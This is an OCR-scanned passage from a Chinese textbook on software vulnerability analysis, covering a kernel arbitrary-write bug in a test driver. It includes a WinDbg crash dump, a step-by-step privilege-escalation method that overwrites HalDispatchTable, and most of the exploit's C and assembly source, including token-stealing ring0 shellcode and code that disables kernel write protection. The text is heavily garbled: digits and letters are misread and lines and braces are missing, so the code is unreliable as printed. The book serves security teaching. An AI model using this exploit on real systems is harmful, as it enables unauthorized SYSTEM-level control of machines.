mov
dword ptr [ecx],eax
MM_INTERNAL_CODE:@
DEBUG_FLR_IMAGE_TIMESTAMP:
FAULTING_MODULE: f9e32eBe test
DEFAULT_BUCKET_ID:CODE_CORRUPTION
BUGCHECK_STR:@x5e
PROCESS_NAME:test.exe
TRAP_FRAME:f61b6b9c -- (. trap exffffffff61b6b9c)
ErrCode - eeeee082
eax=00eeeeee ebx=82567498 ecx=808e8e8e edx=ee12ff7e es1=825cef38 ed1=8256f15e
---
## Page 423
404漏洞战争：软件漏洞分析精要
e1p=f9e32546 esp=f61b6c1θ ebp=f61b6c34 1op1=θ
nv up ei p1 zr na pe nc
cs=0088 ss=001e ds=0023 es-0023 fs=0030 gs=0000
ef1=0ee1e246
test+ex546:
f9032546 8901
BOV
dword ptr [ecx],eax ds:0023:80808080=??77????
//向ex80808080
写入数据，证明前面的分析是正确的
Resetting default scope
LAST_CONTROL_TRANSFER: fron 8e53377f to 804e45a2
STACK_TEXT:
f61b66ec 8053377f e0eeeee3 8e888080 0eeeeeee nt1Rt1pBreakwithStatusInstruction
f61b6738 80534256 00eee003 886f103c c0202020 nt1KiBugCheckDebugBreak+@x19
f61b6b18 80534846 0000050 88888080 0e08ee01 nt1KeBugCheck2+ex574
f61b6b38 885251ee eeeeee5e 88888888 8eeee8e1 nt1KeBugCheckEx+ex1b
f61b6b84 804e272b e0eee0e1 8e888088 00eee0e0 nt1MnAccessFault+ex6f5
f61b6b84 f9032546 00000001 88808080 0000000 nt1KiTrapeE+exc
WARNING: Stack unarind infornation not avaflable. Following franes may be wrong.
f61b6c34 804e4887 825a29de 82567498 886f187e test+ex546
//编润函数
f61b6c44 80569191 825675e8 8256f15e 82567498 nt1IopfCa110river+ex31
f61b6c58 80578eca 825a29de 82567498 8256f15e nt1IopSynchronousServ1ceTa11+ex7e
f61b6dee 8e57a5e3 eeeee7e8 eeeeeeeeeeeeeeee nt!IopXxxxControlFile+ex611
f61b6d34 8e4df7ec eeeee7e8 eeeeeeee eeeeeeee nt1NtDev1ceIoControlF1le+ex2a
f61b6d34 7c92e526 eeee07e8 eeeeeee0 e0eeeeee nt1KiFastCa11Entry+exf8
0012fe94 7c92d28a 7c801675 000e07e8 0000eee0 ntd111KiIntSystenCa11+0x6
e012fe98 7c801675 eeeee7e8 eeeeeeee eee8eee0 ntd111za0eviceIoContro1File+exc
e012fef8 e040116c eeeee7e8 8888ae03 ee12ff7e kerne1321DeviceIoControl+exdd
ee12ff80 e04e1399 e00000e1 00380f60 0038ff8 test_488000+ex116c
0012ffce 7c817e77 e0241fe4 0e12f7bc 7ffdc0e0 test_40eeee+ex1399
ee12fffe eeeeeeee ee4012be eeeeeeee 78746341 kerne1321BaseProcessStart+ex23
STACK_COMMAND:kb
CHKIMG_EXTENSION: 1chkimg -1o 5e -d Int
[ fa f7 8e ec 02:e9 cf 7c 7b 77 ]
.略部分内容……
WARNING: Ichkimg output was truncated to 5e lines. Invoke Ichkimg without *-1o [nun_lines]’
to view entire output.
231 errors : 1nt (884d9f94-885363e8)
---
## Page 424
第9章内核漏润分析405
MODULE_NAME: memory_corrupt:ion
IMAGE_NAME: memory_corrupt:ion
FOLLowUP_NAME: memory_corruption
MEMORY_CORRUPTOR: LARGE
FAILURE_BUCKET_ID:MEMORY_CORRUPTION_LARGE
BUCKET_ID:MEMORY_CORRUPTION_LARGE
Fo1lowup: menory_corruption
9.3.2漏洞利用
由于利用漏润可向任意地址写入任意数据，因此可以采用以下方法进行内核提权。
（1）获取HalDispatchTable表地址，再偏移0x4找到HalQuerySystemlnformation函数地址。
（2）利用内核漏洞将HalQuerySystemlnformation函数地址修改为 0x0.
（3）在0x0地址处申请内存，然后将ring0 Shellcode复制过去。
（4）通过调用NtQueryIntervalProfile函数执行Ox0处的Shellcode代码。
（5）Shellcode 通过将当前system进程的 token值赋值给当前进程，即可获取system权限。
对应的利用代码如下：
#def1ne I0CTL_C0DE ex8888Ae03
PVOID Rt1A1locateMenory(
IN ULONG Length)
NTSTATUS NtStatus;
PVOID BaseAddress = MULL;
---
## Page 425
406漏润战争：软件漏洞分析精要
NtStatus = NtAllocateVirtualMemory(
NtCurrentProcess(),
8BaseAddress,
0,
&Length,
MEM_RESERVE |
MEM_COMMIT,
PAGE_READWRITE);
If(NtStatus == STATUS_SUCCESS)
Rt1ZeroMemory(BaseAddress, Length);
return BaseAddress;
return NULL;
VOID Rt1FreeMemory(
IN PVoID BaseAddress)
1
NTSTATUS NtStatus;
ULONG FreeSize = θ;
NtStatus = NtFreeVirtualMemory(
NtCurrentProcess(),
8BaseAddress,
MEM_RELEASE);
&FreeSize,
char g_ressdtoutputBuffer[4]={e);//输出的缓冲区
DWORD g_uCrB=θ;
NTSTATUS MyShel1Code(
ULONG InformationClass,
---
## Page 426
第9章内核漏润分析407
ULONG BufferSize,
PVOID Buffer,
PULONG ReturnedLength)
//关闭内核写保护
asm
c11
mov eax, cne
nov g_uCrθ, eax
and eax, exFFFEFFFF
nov cre, eax
//提权到SYSTEM
_asn
mov
eax,@xFFDFF124
// eax = KPCR (not 3G Mode)
mov eax,[eax]
//获取当前线程PETHREAD
mov es1,[eax+ex22e]
//获取当前线程所属进程的PEPROCESS
mov eax,es1
searchXp:
mov eax,[eax+ex88]
sub eax,@x88
//获取进程链表中下一个进程的PEPROCESS
mov edx,[eax+ex84]
//获取该进程的pid到edx
cmp edx,0x4
//通过PID查找SYSTEM进程
mov eax,[eax+exc8]
//获取system进程的token
mov [es1+exc8],eax
//修改当前进程的token
//恢复内核写保护
_asm
{
sti
mov eax, g_ucre
mov cre, eax
return 8;
vo1d ShowAlertMsg()
---
## Page 427
408漏洞战争：软件漏洞分析精要
{
LPVOID 1pMsgBuf;
DWORD dw = GetLastError();
FormatMessage(
FORMAT_MESSAGE_ALLOCATE_BUFFER 1
FORMAT_MESSAGE_FROM_SYSTEM,
NULL,
dw,
MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) ,
(LPTSTR) &1pMsgBuf,
0, NULL );
printf("%s",1pMsgBuf);
Loca1Free(1pMsgBuf);
Int __cdecl main(int argc, char **angv)
NTSTATUS NtStatus;
HANDLE DeviceHandle;
ULONG ReturnLength = @;
char g_InputBuffer[4] ="\(xee\xee\xee\xee*;
ULONG InageBase;
rasegpaddew GIOAd
UCHAR InageName[KERNEL_NAME_LENGTH];
ULONG D11Characteristics = DONT_RESOLVE_DLL_REFERENCES;
PVOID HalDispatchTable;
PVOID xHa1QuerySystenInformation;
PVOID MnUserProbeAddress;
ULONG Shel1CodeSize = PAGE_SIZE;
PVOID Shel1CodeAddress;
PVOID BaseAddress = NULL;
UNICODE_STRING DeviceName;
UNICODE_STRING D11Name;
ANSI_STRING ProcedureName;
---
## Page 428
第9章内核漏润分析409
0BJECT_ATTRIBUTES ObjectAttributes;
IO_STATUS_BLOCK IoStatusBlock;
SYSTEM_MoOULE_INFORMATION_EX *ModuleInformation = NULL;
LARGE_INTEGER Interval;
ULONG TextColor;
//获取内核模块列表数据大小到ReturnLength
NtStatus = NtQuerySystenInformation(
SystemModuleInformation,
ModuleInformation,
ReturnLength,
&ReturnLength);
1f(NtStatus = STATUS_INFO_LENGTH_MISMATCH)
ModuleInformation = Rt1A1locateMemory(ReturnLength);
//申请内存用于存放内核模块
列表数据
1f(ModuleInformation)
//获取内核模块列表数据到ModuleInformation
NtStatus = NtQuerySystemInformation(
SystenModuleInfornation,
ModuleInformation,
ReturnLength,
NULL);
1f(NtStatus *= STATUS_SUCCESS)
//从内核模块列表中获取内核第一个模块的基址和名称
ImageBase = (ULONG)(ModuleInformation->Modules[e] .Base);
//获取模块基址
Rt1MoveMenory(
ImageName，//获取模块名称
(PVoID)(ModuleInformation->Modules[e].ImageName +
ModuleInformation->Modules[e] ModuleNameOffset),
KERNEL_NAME_LENGTH) ;
---
## Page 429
410漏洞战争：软件漏洞分析精要
" * ImageBase - exx.8X
**\n"
“*Imageliame - Xs
In"
In",
ImageBase,
InageName);
Rt1FreeMemory(ModuleInformation) ;
//释放存放内核模块列表的内存
Rt1CreateUnicodeStringFromAsciiz(&D1IName, (PUCHAR)ImageName);
//获取
内核模块的 UnicodeString
//加载内核模块到本地进程
NtStatus = LdrLoadD11(
NULL,
// D11Path
8D11characteristics, // D11characteristics
&D11Nane,
// D11Name
(asegpaddewg
// D11Handle
printf(
* * \n*
LdrLoadDLL:");
ShowALertMsg();
Rt1InitAnsiString(&ProcedureName, “Ha1DispatchTable°);
//获取内核HalDispatchTable函数表地址
NtStatus = LdrGetProcedureAddress(
(PVOID)MappedBase,
// D11Handle
&ProcedureName,
// ProcedureName
0,
// ProcedureNumber OPTIONAL
(PvoID*)&Ha1DispatchTable); // ProcedureAddress
printf(* * LdrGetProcedureAddress:“);
ShowAlertMsg();
(ULONG)Ha1DispatchTable -= (ULONG)MappedBase;
(ULONG)Ha1DispatchTable += ImageBase;
//HalDispatchTable 地址+4=HalQuerySystemInformation函数地址
(ULONG)xHa1QuerySystemInformat:ion = (ULONG)Ha1DispatchTable + sizeof(ULONG) ;
printf(*
In*
- * xHalQuerySystenInformation - 0x%.8X
- * Ha1DispatchTable - θxx.8x
Ina
In*,
---
## Page 430
第9章内核漏润分析411
HalDispatchTable,
xHalQuerySystemInformation);
//卸载进程中的内核模块
LdrUnloadD11((PVoID)MappedBase);
Rt1InitunicodeString(&DeviceName, L"\\Device\\ExploitMe");
ObjectAttributes.Length = sizeof(oBJECT_ATTRIBUTES);
ObjectAttributes.RootDirectory =@;
ObjectAttributes.objectName = &DeviceName;
objectAttributes.Attributes = OB3_CASE_INSENSITIVE;
objectAttributes.SecurityDescriptor = NULL;
objectAttributes.SecurityQualityofService = NULL;
//获取驱动设备句柄
NtStatus = NtCreateFile(
8Dev1ceHandle,
// F11eHandle
FILE_READ_DATA |
FILE_WRITE_OATA,
// DesiredAccess
scbjectAttributes,
//objectAttributes
&IoStatusBlock,
//IoStatusBlock
MULL,
// AllocationSize OPTIONAL
0,
//FileAttributes
FILE_SHARE_READ ∣
FILE_SHARE_HRITE,
// ShareAccess
FILE_OPEN_IF,
// CreateDisposition
NULL,